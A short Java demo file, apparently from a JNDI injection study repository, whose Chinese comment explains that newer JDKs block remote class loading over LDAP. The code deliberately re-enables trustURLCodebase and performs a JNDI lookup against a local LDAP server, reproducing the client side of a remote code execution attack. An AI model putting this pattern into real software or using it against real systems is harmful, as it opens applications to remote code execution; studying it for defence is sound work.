package org.payload.jndi.ldap;

import javax.naming.InitialContext;
import javax.naming.NamingException;

public class JNDI_LDAP {
    public static void main(String[] args) throws NamingException {
        //高版本gdk默认是关闭ldap远程加载class文件的，需要设置com.sun.jndi.ldap.object.trustURLCodebase
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
        InitialContext initialContext = new InitialContext();
        initialContext.lookup("ldap://127.0.0.1:1389/dtieej");

    }
}